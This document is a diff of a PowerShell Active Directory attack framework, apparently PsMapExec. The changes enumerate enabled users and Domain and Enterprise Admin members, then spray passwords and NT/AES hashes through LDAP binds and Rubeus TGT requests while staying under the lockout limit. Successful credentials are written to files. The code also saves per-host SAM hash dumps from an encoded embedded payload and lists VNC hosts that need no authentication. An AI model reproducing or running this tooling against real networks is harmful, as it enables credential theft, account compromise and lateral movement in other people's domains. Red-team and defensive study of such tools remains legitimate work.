+elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
+
+
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+
+}
+
+
+elseif ($Method -ne "Spray"){
+if ($Targets -is [string]) {
+    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
+    if ($ipAddress) {
+        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
+        break
+    }
+    else {
+        
+        if ($Targets -notlike "*.*") {
+            $Targets = $Targets + "." + $Domain
+        }
+        
+        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
+            
+            }
+        }
+    }
+}
+
+
+
+################################################################################################################
+############################ Grab interesting users for various parsing functions ##############################
+################################################################################################################
+
+
+# Fetch enabled users
+$searcher = New-Searcher
+$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+$searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
+
+function Get-GroupMembers {
+    param ([string]$GroupName)
+
+    $searcher = New-Searcher
+    $searcher.PropertiesToLoad.AddRange(@("member"))
+    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
+    $group = $searcher.FindOne()
+    $members = @()
+
+    if ($group -ne $null -and $group.Properties["member"]) {
+        foreach ($memberDN in $group.Properties["member"]) {
+            $searcher.Filter = "(distinguishedName=$memberDN)"
+            $searcher.PropertiesToLoad.Clear()
+            $searcher.PropertiesToLoad.AddRange(@("samAccountName", "objectClass"))
+            $object = $searcher.FindOne()
+
+            if ($object -and $object.Properties["objectClass"] -contains "user") {
+                $samName = $object.Properties["samAccountName"]
+                if ($samName -and $samName.Count -gt 0) {
+                    $members += $samName[0].ToString()
+                }
+            }
+        }
+    }
+
+    return $members
+}
+
+
+
+
+
+$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
+$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
+$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
+$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
+
+$FQDNDomainName = $domain.ToLower()
+$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
+$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
+$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
+$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
+
+if ($Method -eq "Spray") {
+    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
+        $Targets = $EnabledDomainUsers
+    }
+    elseif ($Targets -in $EnabledDomainUsers) {
+        $EnabledDomainUsers = $Targets
+    }
+    else {
+        $groupMembers = Get-GroupMembers -GroupName $Targets
+        if ($groupMembers.Count -gt 0) {
+            $EnabledDomainUsers = $groupMembers
+        }
+        elseif ($groupMembers.Count -eq 0) {
+            Write-host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-host "Group either does not exist or is empty"
+            return
+        }
+        else {
+            Write-host "[-] " -ForegroundColor "Red" -NoNewline
+            Write-Host "Unspecified Error"
+            return
+        }
+    }
+}
+
+
+# Grab Computer Accounts for spraying
+function Get-ComputerAccounts {
+    $searcher = New-Searcher
+    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
+    
+    try {
+        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
+        return $ComputerSamAccounts
+    } catch {
+        Write-Error "Failed to fetch computer accounts. Error: $_"
+        return $null
+    }
+}
+
+$ComputerSamAccounts = Get-ComputerAccounts
+
+
+if (!$LocalAuth){
+if ($Method -ne "RDP"){
+if (!$Force){
+foreach ($EnterpriseAdmin in $EnterpriseAdmins){
+        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
+        if ($splitResult.Count -gt 1) {
+        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
+        return
+        }
+    }
+}
+
+if (!$Force) {
+    foreach ($DomainAdmin in $DomainAdmins) {
+        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
+        if ($splitResult.Count -gt 1) {
+            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
+            return
+            }
+        }
+    }
+}
+
+if (!$CurrentUser) {
+    if ($Method -ne "GenRelayList") {
+        if ($Method -ne "SessionHunter"){
+         if ($Method -ne "Spray"){
+        try {
+            $searcher = New-Searcher
+            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
+            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+            $user = $searcher.FindOne()
+            $domainUser = $user.Properties["samAccountName"]
+        }
+        Catch {
+           
+           if ($Ticket -ne $null){} 
+            elseif (!$DomainUser) {
+                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Specified username is not a valid domain user"
+                return
+                
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+
+
 
 ################################################################################################################
 ################################## Information based on selected module ########################################
@@ -873,7 +967,7 @@ foreach ($user in $users) {
 
 
 
-
+# Compressed to help keep under the character limit for console execution
 
 $LocalSAM = @'
 Write-Output "" ; function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
@@ -1342,11 +1436,11 @@ do {
             } 
             elseif ($result -eq "Timed Out") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
             elseif ($result -eq "Successful Connection PME") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
             
             elseif ($result -eq "Unable to connect") {}
@@ -1355,10 +1449,10 @@ do {
                 
                 if ($result -eq "No Results") {
                     if ($successOnly) { continue }
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                 } 
                 else {
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
                     $filePath = switch ($Module) {
                         "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
@@ -1680,11 +1774,11 @@ do {
             } 
             elseif ($result -eq "Timed Out") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
             elseif ($result -eq "Successful Connection PME") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
             
             elseif ($result -eq "Unable to connect") {}
@@ -1693,10 +1787,10 @@ do {
                 
                 if ($result -eq "No Results") {
                     if ($successOnly) { continue }
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                 } 
                 else {
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
                     $filePath = switch ($Module) {
                         "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
@@ -1729,7 +1823,7 @@ do {
                 }
             } 
             elseif ($result -notmatch "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
              # Dispose of runspace and close handle
@@ -1755,6 +1849,7 @@ $runspacePool.Dispose()
 ################################################################################################################
 Function Method-WinRM {
 Write-host
+
 
 # Create a runspace pool
 $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
@@ -1877,11 +1972,11 @@ do {
             } 
             elseif ($result -eq "Timed Out") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
             elseif ($result -eq "Successful Connection PME") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
             
             elseif ($result -eq "Unable to connect") {}
@@ -1890,10 +1985,10 @@ do {
                 
                 if ($result -eq "No Results") {
                     if ($successOnly) { continue }
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                 } 
                 else {
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
                     $filePath = switch ($Module) {
                         "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
@@ -1926,7 +2021,7 @@ do {
                 }
             } 
             elseif ($result -notmatch "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
              # Dispose of runspace and close handle
@@ -3409,11 +3504,11 @@ do {
             } 
             elseif ($result -eq "Timed Out") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
             elseif ($result -eq "Successful Connection PME") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
             
             elseif ($result -eq "Unable to connect") {}
@@ -3422,10 +3517,10 @@ do {
                 
                 if ($result -eq "No Results") {
                     if ($successOnly) { continue }
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                 } 
                 else {
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
                     $filePath = switch ($Module) {
                         "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
@@ -3458,7 +3553,7 @@ do {
                 }
             } 
             elseif ($result -notmatch "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
              # Dispose of runspace and close handle
@@ -3484,43 +3579,6 @@ $runspacePool.Dispose()
 ################################################################################################################
 Function Spray {
 Write-host
-
-if (!$EmptyPassword -and !$AccountAsPassword -and $Hash -eq "" -and $Password -eq ""){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "We need something to spray"
-Write-Host
-Write-host "PsMapExec -Method Spray -Password [Password]"
-Write-host "PsMapExec -Method Spray -Hash [Hash]"
-Write-host "PsMapExec -Method Spray -AccountAsPassword"
-Write-host "PsMapExec -Method Spray -EmptyPassword"
-return
-}
-
-if ($Hash -ne "" -and $Password -ne ""){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "Hash and Password detected"
-return
-}
-
-if ($EmptyPassword -and $Hash -ne "" -or ($EmptyPassword -and $Password -ne "")){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "Password or hash value provided with -EmptyPassword"
-return
-}
-
-if ($AccountAsPassword -and $Hash -ne "" -or ($AccountAsPassword -and $Password -ne "")){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "Password or hash value provided with -EmptyPassword"
-return
-}
-
-if ($AccountAsPassword -and $EmptyPassword){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
-return
-}
-
-    
 
             
 # Create a directory entry for the specified domain
@@ -3550,12 +3608,14 @@ if ($domainObject.Properties.Contains("lockoutThreshold")) {
         $SafeLimit = $LO_threshold - 2
     }
 } else {
-            Write-Host
+            
+        Write-Host
         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
         Write-Host "Threshold not found. Aborting..."
-    return
+        return
 }
 
+# gut this out and replace with the new function
 $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
 
 # Display the $SafeLimit value
@@ -3563,12 +3623,12 @@ Write-Output " - Lockout Threshold  : $LO_threshold"
 Write-Output " - Safety Limit value : $SafeLimit"
 Write-Output " - Removed disabled accounts from spraying"
 
-if ($Hash -ne ""){
+if ($SprayHash -ne ""){
     Write-Host
-    $Password = ""
+    $SprayPassword = ""
     $AccountAsPassword = $False
 
-    if ($Hash.Length -ne 32 -and $Hash.Length -ne 64) {
+    if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64) {
         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
         Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
         Write-Host 
@@ -3577,26 +3637,26 @@ if ($Hash -ne ""){
 
     Write-Host
     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Spraying with Hash value: $Hash"
+    Write-Host "Spraying with Hash value: $SprayHash"
     Write-Host
 
 }
 
-if ($Password -ne ""){
-    $Hash = ""
+if ($SprayPassword -ne ""){
+    $SprayHash = ""
     $AccountAsPassword = $False
 
     Write-Host
     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "Spraying with password value: $Password"
+    Write-Host "Spraying with password value: $SprayPassword"
     Write-Host
 
 }
 
 
 if ($AccountAsPassword){
-    $Hash = ""
-    $Password = ""
+    $SprayHash = ""
+    $SprayPassword = ""
 
     Write-Host
     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
@@ -3605,8 +3665,8 @@ if ($AccountAsPassword){
 }
 
 if ($EmptyPassword){
-    $Password = ""
-    $Hash = ""
+    $SprayPassword = ""
+    $SprayHash = ""
     $AccountAsPassword = $False     
     
     Write-Host
@@ -3632,9 +3692,9 @@ $searchResult = $searcher.FindOne()
     }
 }
            # Hash Spraying
-            if ($Hash -ne ""){
-            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
-            elseif ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
+            if ($SprayHash -ne ""){
+            if ($SprayHash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain" | Out-String}
+            elseif ($SprayHash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain" | Out-String}
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3654,19 +3714,19 @@ $searchResult = $searcher.FindOne()
             elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
                 Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                 Write-Host "$Domain\$UserToSpray"
-                "$Domain\${UserToSpray}:$Hash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
+                "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
         }
     }
 
     # Password Spraying
-   if ($Password -ne ""){
+   if ($SprayPassword -ne ""){
 
-        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
+        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$SprayPassword)
         
         if ($Attempt.name -ne $null){
             Write-Host "[+] " -ForegroundColor "Green" -NoNewline
             Write-Host "$Domain\$UserToSpray"
-            "$Domain\${UserToSpray}:$password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
+            "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
 }
 
         elseif (!$SuccessOnly){
@@ -3877,7 +3937,7 @@ do {
 
                 if ($result -eq "Not Supported") {
                     if ($successOnly) { continue }
-                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Red -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                             continue
             } 
 
@@ -3887,7 +3947,7 @@ do {
                             continue
             } 
                 elseif ($result -eq "Supported") {
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                         $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
             } 
 
@@ -4212,7 +4272,7 @@ Function Parse-eKeys {
     $outputFilePath = "$ekeys\.eKeys-Parsed.txt"
 
     # Initialize the DirectorySearcher outside of the loop for better performance
-    $domainSearcher = New-Object System.DirectoryServices.DirectorySearcher
+    $domainSearcher = New-Searcher
 
     Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
         $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
@@ -4468,7 +4528,7 @@ if (!$CurrentUser) {
     Start-sleep -Milliseconds 100
     klist purge | Out-Null
     Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-        
+            
         }
     }
 }
@@ -4519,6 +4579,8 @@ $elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds
 # Display the formatted elapsed time
 $elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
 Write-Host "Elapsed Time     : $elapsedTime"
+
 Get-Variable | Remove-Variable -ErrorAction SilentlyContinue
+try {$searcher.Dispose()} Catch {}
 
 }
